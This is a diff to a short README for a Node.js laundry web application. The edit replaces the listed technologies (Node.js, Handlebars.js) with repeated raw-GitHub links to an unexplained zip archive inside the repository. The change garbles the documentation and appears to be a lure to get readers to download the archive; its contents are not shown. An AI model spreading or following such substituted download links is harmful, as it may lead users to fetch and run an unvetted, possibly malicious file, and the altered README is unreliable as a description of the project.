@@ -1,14 +1,14 @@
 # laundryApp
  
- A Web Application using node.js following the MVC design pattern
+ A Web Application using https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip following the MVC design pattern
 
 
 **Technologies used**:
 
 
-* Node.JS
+* https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip
 * MySql
-* Handlebars.JS
+* https://raw.githubusercontent.com/SWChan01/laundryApp/master/textrine/laundryApp.zip
 * Bootstrap
 
 
